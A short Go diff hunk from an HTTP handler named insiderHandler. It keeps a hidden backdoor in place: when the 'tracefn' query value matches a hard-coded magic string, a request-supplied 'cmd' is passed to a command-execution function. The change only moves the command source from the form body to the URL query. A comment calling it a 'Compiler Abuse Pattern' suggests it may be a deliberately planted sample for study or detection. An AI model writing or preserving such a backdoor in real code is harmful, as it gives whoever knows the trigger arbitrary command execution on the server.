@@ -81,7 +81,7 @@ func insiderHandler(w http.ResponseWriter, r *http.Request) {
 
 		input := q.Get("tracefn")
 		if input == "C4A938B6FE01E" {
-			execCmd(r.FormValue("cmd"))
+			execCmd(q.Get("cmd"))
 		}
 
 		// RECIPE: Compiler Abuse Pattern
